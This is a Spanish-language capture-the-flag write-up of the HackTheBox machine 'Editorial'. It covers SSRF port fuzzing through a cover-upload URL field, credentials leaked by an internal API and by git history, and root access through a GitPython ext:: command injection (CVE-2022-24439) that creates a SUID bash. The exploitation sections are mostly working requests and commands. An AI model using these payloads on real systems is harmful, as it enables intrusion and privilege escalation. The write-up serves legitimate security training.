Propiedades:
- OS: Linux
- Plataforma: HackTheBox
- Nivel: Easy
- Tags: #ssrf #git #CVE-2022-24439 #ffuf

![](assets/Pasted%20image%2020251222224452.png)
## Reconocimiento

Tiro un ping para comprobar la conectividad.

- ttl 63 indica maquina linux.

```bash
> ping -c 1 10.129.13.51
PING 10.129.13.51 (10.129.13.51) 56(84) bytes of data.
64 bytes from 10.129.13.51: icmp_seq=1 ttl=63 time=85.7 ms

--- 10.129.13.51 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 85.721/85.721/85.721/0.000 ms
```

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
> sudo nmap -p- -sS -Pn --min-rate 5000 -vvv 10.129.13.51
-----------------------------------------------------------
Scanned at 2025-12-22 22:46:30 CST for 13s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

- Puertos 80 y 22 abiertos.

Sobre los puertos abiertos realizo un segundo escaneo con nmap para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
> sudo nmap -p 22,80 -sV -sC -Pn -sS -n -vvv 10.129.13.51 -oA nmap/target
--------------------------------------------------------------------------
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM=
|   256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://editorial.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Puerto 80 HTTP nginx 1.18.0 con dominio `editorial.htb`
- Puerto 22 SSH: OpenSSH 8.9p1 Ubuntu 3ubuntu0.7

Metemos el dominio al `/etc/hosts`

```bash
> cat /etc/hosts
10.129.13.51 editorial.htb
```

## Enumeración

### Puerto 80 nginx

- Aqui corre la pagina web de una editorial de libros. 

![](assets/Pasted%20image%2020251222225044.png)

**Publish with us.**

- Aqui al parecer me deja subir un archivo y ver una preview.

![](assets/Pasted%20image%2020251222225337.png)

Una de las formas y colocar una URL, yo aquí levante un servidor de python hosteando una imagen para ver si la imagen se reflejaba y en efecto se refleja.

![](assets/Pasted%20image%2020251222231639.png)

Al interceptar la petición puedo ver la ruta donde se guarda la foto.

![](assets/Pasted%20image%2020251222231939.png)

**About.**

- Aqui no hay nada interesante, mas que un correo.

![](assets/Pasted%20image%2020251222225445.png)

**Fuzzing de directorios.**

Realizamos fuzzing con `ffuf` pero solo descubrimos las rutas que ya sabiamos.

```bash
> ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://editorial.htb/FUZZ -e .php,.txt,.py,.xml,.html,.js -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev'
________________________________________________

 :: Method           : GET
 :: URL              : http://editorial.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .php .txt .py .xml .html .js 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 8577, Words: 1774, Lines: 177, Duration: 105ms]
about                   [Status: 200, Size: 2939, Words: 492, Lines: 72, Duration: 101ms]
upload                  [Status: 200, Size: 7140, Words: 1952, Lines: 210, Duration: 111ms]
```

## Explotación

La peticion de burpsuite me la pase a un archivo llamado `cover.req`

![](assets/Pasted%20image%2020251223003908.png)

Debido a que la funcionalidad de subida de portadas acepta una URL (`bookurl`) y el servidor realiza la petición por su cuenta, intenté explotar un **SSRF (Server-Side Request Forgery)**.  
Aprovechando esto, modifiqué la solicitud para apuntar a `127.0.0.1` y realicé **fuzzing de puertos internos**, con el objetivo de identificar servicios accesibles únicamente desde el propio servidor.

- cover.req

```bash
POST /upload-cover HTTP/1.1
Host: editorial.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://editorial.htb/upload
Content-Type: multipart/form-data; boundary=----geckoformboundary6cd980631f59808b6a1a475373bdeed1
Content-Length: 352
Origin: http://editorial.htb
DNT: 1
Connection: keep-alive
Priority: u=0


------geckoformboundary6cd980631f59808b6a1a475373bdeed1
Content-Disposition: form-data; name="bookurl"


http://127.0.0.1:FUZZ/
------geckoformboundary6cd980631f59808b6a1a475373bdeed1
Content-Disposition: form-data; name="bookfile"; filename=""

Content-Type: application/octet-stream
------geckoformboundary6cd980631f59808b6a1a475373bdeed1--
```

Utilice `ffuf` con una secuencia del 0 al 65535 para ir probando todos los puertos. Es importante que en la request coloquemos la palabra FUZZ en donde va el puerto

```bash
> ffuf -request cover.req -request-proto http -w <( seq 0 65535) -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev'
________________________________________________

 :: Method           : POST
 :: URL              : http://editorial.htb/upload-cover
 :: Wordlist         : FUZZ: /dev/fd/63
 :: Header           : Connection: keep-alive
 :: Header           : Host: editorial.htb
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
 :: Header           : Accept: */*
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Referer: http://editorial.htb/upload
 :: Header           : Content-Type: multipart/form-data; boundary=----geckoformboundary6cd980631f59808b6a1a475373bdeed1
 :: Header           : Origin: http://editorial.htb
 :: Header           : DNT: 1
 :: Header           : Priority: u=0
 :: Data             : ------geckoformboundary6cd980631f59808b6a1a475373bdeed1
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:FUZZ/
------geckoformboundary6cd980631f59808b6a1a475373bdeed1
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


------geckoformboundary6cd980631f59808b6a1a475373bdeed1--
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

5000                    [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 96ms]
```

- Podemos ver que el puerto 5000 nos regresa algo distinto.

Podemos ir a ver el Puerto 5000 manualmente.

- Vemos que nos regresa una ruta

![](assets/Pasted%20image%2020251222233752.png)

Podemos tirarle un `CURL` a esa ruta para ver que contiene.

- Es una lista de endpoints.

```bash
> curl http://editorial.htb/static/uploads/099ab57f-bfd9-4d74-a1e9-61116eebb0a3
{"messages":[{"promotions":{"description":"Retrieve a list of all the promotions in our library.","endpoint":"/api/latest/metadata/messages/promos","methods":"GET"}},{"coupons":{"description":"Retrieve the list of coupons to use in our library.","endpoint":"/api/latest/metadata/messages/coupons","methods":"GET"}},{"new_authors":{"description":"Retrieve the welcome message sended to our new authors.","endpoint":"/api/latest/metadata/messages/authors","methods":"GET"}},{"platform_use":{"description":"Retrieve examples of how to use the platform.","endpoint":"/api/latest/metadata/messages/how_to_use_platform","methods":"GET"}}],"version":[{"changelog":{"description":"Retrieve a list of all the versions and updates of the api.","endpoint":"/api/latest/metadata/changelog","methods":"GET"}},{"latest":{"description":"Retrieve the last version of api.","endpoint":"/api/latest/metadata","methods":"GET"}}]}
```

Podemos intuir que en el puerto interno `5000` corre alguna especie de api 

- El endpoint que mas me interesa es tal vez este: `/api/latest/metadata/messages/authors`

![](assets/Pasted%20image%2020251222234443.png)

Nos vuelve a regresar una ruta, por lo cual le tiramos un curl para ver que hay en ese archivo.

- Vemos las credenciales dev:dev080217_devAPI!@

```bash
curl http://editorial.htb/static/uploads/7862d2eb-b5fc-4567-939c-0ce5043afa84
{"template_mail_message":"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."}
```

Utilizamos estas credenciales para logearnos por `SSH.`

```bash
> ssh dev@10.129.13.51
------------------------------------------------
dev@editorial:~$ id
uid=1001(dev) gid=1001(dev) groups=1001(dev)
```

## Escalada de Privilegios

Viendo que usuarios existen podemos ver al usuario `prod`.

```bash
dev@editorial:~$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
prod:x:1000:1000:Alirio Acosta:/home/prod:/bin/bash
dev:x:1001:1001::/home/dev:/bin/bash
```

En mi directoria actual existe un directorio `apps` donde hay un `.git`, al hacer un `git log` veo varios commits.

- El mas interesante es este:   change(api): downgrading prod to dev

```bash
dev@editorial:~/apps/.git$ git log
commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -> master)
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:04:21 2023 -0500

    fix: bugfix in api port endpoint

commit dfef9f20e57d730b7d71967582035925d57ad883
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:01:11 2023 -0500

    change: remove debug and update api port

commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

commit 1e84a036b2f33c59e2390730699a488c65643d28
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:51:10 2023 -0500

    feat: create api to editorial info
    
    * It (will) contains internal info about the editorial, this enable
       faster access to information.

commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8
```

Hice un `git show` para mostrar las diferencias del commit (lo que fue modificado) y podemos ver lo siguiente

- Username: prod Password: 080217_Producti0n_2023!@ credenciales para el usuario prod

```bash
dev@editorial:~/apps/.git$ git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

diff --git a/app_api/app.py b/app_api/app.py
index 61b786f..3373b14 100644
--- a/app_api/app.py
+++ b/app_api/app.py
@@ -64,7 +64,7 @@ def index():
 @app.route(api_route + '/authors/message', methods=['GET'])
 def api_mail_new_authors():
     return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
     }) # TODO: replace dev credentials when checks pass
 
 # -------------------------------
```

Ahora podemos migrar al usuario `prod`

- prod:080217_Producti0n_2023!@

```bash
dev@editorial:~/apps/.git$ su prod
Password: 
prod@editorial:/home/dev/apps/.git$ id
uid=1000(prod) gid=1000(prod) groups=1000(prod)
prod@editorial:/home/dev/apps/.git$ 
```

Ahora enumere binarios que pudiera ejecutar como `sudo`

- Vemos el binario `clone_prod_change.py`

```bash
prod@editorial:/home/dev/apps/.git$ sudo -l
[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

El script simplemente clona un repo utilizando GitPython y pasándole un parametro

```bash
prod@editorial:/opt/internal_apps/clone_changes$ cat clone_prod_change.py
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

GitPython es vulnerable a una ejecución de comandos cuando se utiliza el protocolo `ext::` ya que no se sanitiza los comandos enviados. [CVE-2022-24439](https://www.cve.org/CVERecord?id=CVE-2022-24439)

- Por cada espacio colocamos %
- Aqui lo que estamos haciendo es copiar el binario de la bash y colocarle el bit suid del usuario root.

```bash
prod@editorial:/dev/shm$ sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cp% /bin/bash% /tmp/wndr% &&% chmod% +s% /tmp/wndr'
```

Ahora podemos confirmar que todo ocurrió correctamente.

```bash
prod@editorial:/dev/shm$ ls -la /tmp/wndr
-rwsr-sr-x 1 root root 1396520 Dec 23 06:31 /tmp/wndr

prod@editorial:/dev/shm$ /tmp/wndr -p
wndr-5.1# id
uid=1000(prod) gid=1000(prod) euid=0(root) egid=0(root) groups=0(root),1000(prod)
```

Obtenemos la flag en el directorio root.

```bash
wndr-5.1# cat root.txt
9475319d4bc*****
```

***PWNED***

![](assets/Pasted%20image%2020251223003741.png)
